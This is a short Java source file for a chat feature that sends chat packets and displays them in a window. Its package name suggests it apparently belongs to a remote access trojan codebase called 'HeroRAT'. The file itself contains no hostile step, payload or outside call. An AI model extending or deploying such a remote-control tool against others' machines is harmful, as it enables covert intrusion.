package net.herorat.features.chat;

import java.io.DataOutputStream;

import net.herorat.network.Packet;
import net.herorat.network.Packet5Chat;


public class Chat
{
	public static StringBuffer buffer_chat = new StringBuffer();
	public static FrameChat frame;
	private static DataOutputStream outputstream;
	
	public static void send(String message)
	{
		Packet p = new Packet5Chat(outputstream, new String[] { message });
		p.write();
	}
	
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		Chat.outputstream = outputstream;
		
		if (frame == null)
		{
			frame = new FrameChat();
		}
		frame.setVisible(true);

		StringBuffer buffer = new StringBuffer();
		for (int i=1; i<args.length; i++)
		{
			buffer.append(args[i]);
		}
		
		buffer_chat.append(args[0] + ": " + buffer.toString() + "\n");
		frame.area_chat.setText(buffer_chat.toString());
	}
}